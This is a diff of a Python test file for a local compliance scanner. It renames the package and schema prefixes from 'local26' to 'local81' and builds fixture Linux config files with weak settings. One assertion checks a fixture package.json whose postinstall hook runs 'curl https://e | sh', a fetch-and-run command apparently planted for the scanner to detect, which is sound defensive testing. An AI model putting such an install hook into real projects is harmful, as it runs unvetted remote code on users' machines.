@@ -4,9 +4,9 @@ import json
 import os
 from pathlib import Path
 
-from local26.compliance import build_harden_plan, build_inventory, scan_compliance
-from local26.compliance.catalog import RULES
-from local26.compliance.renderers import render_harden_plan, render_inventory, render_report
+from local81.compliance import build_harden_plan, build_inventory, scan_compliance
+from local81.compliance.catalog import RULES
+from local81.compliance.renderers import render_harden_plan, render_inventory, render_report
 
 
 def test_compliance_catalog_has_unique_mapped_rules() -> None:
@@ -29,7 +29,7 @@ def test_linux_scanner_reads_fixture_root(tmp_path: Path) -> None:
     os.chmod(tmp_path / "tmp", 0o777)
     (tmp_path / "etc/os-release").write_text('PRETTY_NAME="Fixture Linux"\n', encoding="utf-8")
     (tmp_path / "etc/ssh/sshd_config").write_text("PermitRootLogin yes\nMaxAuthTries 8\n", encoding="utf-8")
-    (tmp_path / "etc/sysctl.d/99-local26.conf").write_text("net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 2\n", encoding="utf-8")
+    (tmp_path / "etc/sysctl.d/99-local81.conf").write_text("net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 2\n", encoding="utf-8")
     (tmp_path / "etc/fstab").write_text("tmpfs /tmp tmpfs defaults 0 0\n", encoding="utf-8")
     (tmp_path / "etc/security/pwquality.conf").write_text("minlen = 14\n", encoding="utf-8")
 
@@ -132,9 +132,9 @@ def test_renderers_emit_json_and_non_mutating_harden_plan(tmp_path: Path) -> Non
     report_markdown = render_report(report, "markdown")
     inventory_markdown = render_inventory(inventory, "markdown")
 
-    assert report_json["schema_version"] == "local26.compliance.report.v0.1"
-    assert inventory_json["schema_version"] == "local26.compliance.inventory.v0.1"
+    assert report_json["schema_version"] == "local81.compliance.report.v0.1"
+    assert inventory_json["schema_version"] == "local81.compliance.inventory.v0.1"
     assert plan_json["summary"]["mutating_actions"] == 0
-    assert report_markdown.startswith("# Local-26 compliance report")
-    assert inventory_markdown.startswith("# Local-26 compliance inventory")
+    assert report_markdown.startswith("# Local-81 compliance report")
+    assert inventory_markdown.startswith("# Local-81 compliance inventory")
     assert (tmp_path / "package.json").read_text(encoding="utf-8") == '{"scripts":{"postinstall":"curl https://e | sh"}}'
